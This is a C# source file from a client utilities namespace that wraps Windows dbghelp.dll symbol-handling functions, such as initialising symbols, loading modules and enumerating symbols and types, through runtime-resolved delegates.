using Everything.Win32PE.Structs;
using System;
using System.Runtime.InteropServices;

namespace Quasar.Client.Utilities
{
    internal static partial class ClientNatives
    {
        internal delegate uint SymGetOptionsProc();
        internal static uint SymGetOptions() => Lookup<SymGetOptionsProc>("dbghelp.dll", "SymGetOptions")();

        internal delegate uint SymSetOptionsProc(uint SymOptions);
        internal static uint SymSetOptions(uint SymOptions) => Lookup<SymSetOptionsProc>("dbghelp.dll", "SymSetOptions")(SymOptions);

        internal delegate bool SymInitializeProc(
            IntPtr hProcess,
            [MarshalAs(UnmanagedType.LPWStr)] string UserSearchPath,
            bool fInvadeProcess);
        internal static bool SymInitialize(IntPtr hProcess, string UserSearchPath, bool fInvadeProcess)
            => Lookup<SymInitializeProc>("dbghelp.dll", "SymInitialize")(hProcess, UserSearchPath, fInvadeProcess);

        internal unsafe delegate ulong SymLoadModuleExProc(
            IntPtr hProcess,
            IntPtr hFile,
            [MarshalAs(UnmanagedType.LPWStr)] string ImageName,
            [MarshalAs(UnmanagedType.LPWStr)] string ModuleName,
            long BaseOfDll,
            uint DllSize,
            _MODLOAD_DATA* Data,
            uint Flags);
        internal static unsafe ulong SymLoadModuleEx(
            IntPtr hProcess,
            IntPtr hFile,
            [MarshalAs(UnmanagedType.LPWStr)] string ImageName,
            [MarshalAs(UnmanagedType.LPWStr)] string ModuleName,
            long BaseOfDll,
            uint DllSize,
            _MODLOAD_DATA* Data,
            uint Flags)
            => Lookup<SymLoadModuleExProc>("dbghelp.dll", "SymLoadModuleEx")(hProcess, hFile, ImageName, ModuleName, BaseOfDll, DllSize, Data, Flags);

        internal unsafe delegate bool SymGetModuleInfo64Proc(IntPtr hProcess, ulong qwAddr, ref _IMAGEHLP_MODULE64 ModuleInfo);
        internal static unsafe bool SymGetModuleInfo64(IntPtr hProcess, ulong qwAddr, ref _IMAGEHLP_MODULE64 ModuleInfo)
            => Lookup<SymGetModuleInfo64Proc>("dbghelp.dll", "SymGetModuleInfo64")(hProcess, qwAddr, ref ModuleInfo);

        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool SymEnumSymbolsProc(
            IntPtr hProcess,
            ulong modBase,
            [MarshalAs(UnmanagedType.LPWStr)] string mask,
            native_SYM_ENUMERATESYMBOLS_CALLBACK callback,
            IntPtr pUserContext);
        internal static bool SymEnumSymbols(
            IntPtr hProcess,
            ulong modBase,
            [MarshalAs(UnmanagedType.LPWStr)] string mask,
            native_SYM_ENUMERATESYMBOLS_CALLBACK callback,
            IntPtr pUserContext)
            => Lookup<SymEnumSymbolsProc>("dbghelp.dll", "SymEnumSymbols")(hProcess, modBase, mask, callback, pUserContext);

        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool SymEnumTypesProc(IntPtr hProcess, ulong BaseOfDll, native_SYM_ENUMERATESYMBOLS_CALLBACK callback, IntPtr UserContext);
        internal static bool SymEnumTypes(IntPtr hProcess, ulong BaseOfDll, native_SYM_ENUMERATESYMBOLS_CALLBACK callback, IntPtr UserContext)
            => Lookup<SymEnumTypesProc>("dbghelp.dll", "SymEnumTypesW")(hProcess, BaseOfDll, callback, UserContext);

        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool native_SYM_ENUMERATESYMBOLS_CALLBACK( /* SYMBOL_INFO* */ IntPtr symInfo, uint symbolSize, IntPtr pUserContext);

        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool SymCleanupProc(IntPtr hProcess);
        internal static bool SymCleanup(IntPtr hProcess)
            => Lookup<SymCleanupProc>("dbghelp.dll", "SymCleanup")(hProcess);
    }
}
